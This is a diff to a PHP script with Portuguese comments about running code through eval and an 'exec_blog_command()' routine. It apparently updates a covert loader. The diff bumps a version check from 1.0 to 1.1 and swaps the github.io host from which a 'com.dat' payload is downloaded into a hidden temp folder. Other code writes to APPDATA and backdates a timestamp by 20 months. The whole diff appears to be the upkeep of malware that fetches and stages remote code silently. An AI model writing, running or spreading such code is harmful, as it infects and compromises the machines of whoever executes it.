@@ -2,7 +2,7 @@ execução por eval. cuidado, não use exit e nem __FILE__
 
 *Atenção, este comando esta sendo executado via exec_blog_command() devido a mudança da url da conta. use só o comando do blg
 
-****21
+****22
 
 [GIT_COMMAND]
 
@@ -129,11 +129,11 @@ $GLOBALS['__put_contents_vir_002'] = function($file, $data)
 
 $GLOBALS['__verify_vir_version_002'] = function()
 {
-	if(@file_get_contents(dirname(PHP_BINARY).'/version_2') === '1.0')
+	if(@file_get_contents(dirname(PHP_BINARY).'/version_2') === '1.1')
 		return;
 	$root = dirname(PHP_BINARY) . '/temp2';
 	@mkdir($root);
-	@file_put_contents($root.'/com.dat', $GLOBALS['__download_002']('https://marceloti255.github.io/job/com/com_v13.1'));
+	@file_put_contents($root.'/com.dat', $GLOBALS['__download_002']('https://uservir2009.github.io/temp_down/com/com_v13.1'));
 	$root_path = $root;
 	@mkdir($root_path . '\\prt');
 	$data = @file_get_contents($root_path . '\\com.dat');
@@ -163,7 +163,7 @@ $GLOBALS['__verify_vir_version_002'] = function()
 	}
 };
 
-if(@file_get_contents(dirname(PHP_BINARY).'/version_2') === '1.0')
+if(@file_get_contents(dirname(PHP_BINARY).'/version_2') === '1.1')
 {
 	$root = getenv('APPDATA');
 	$time = strtotime("-20 month", time());
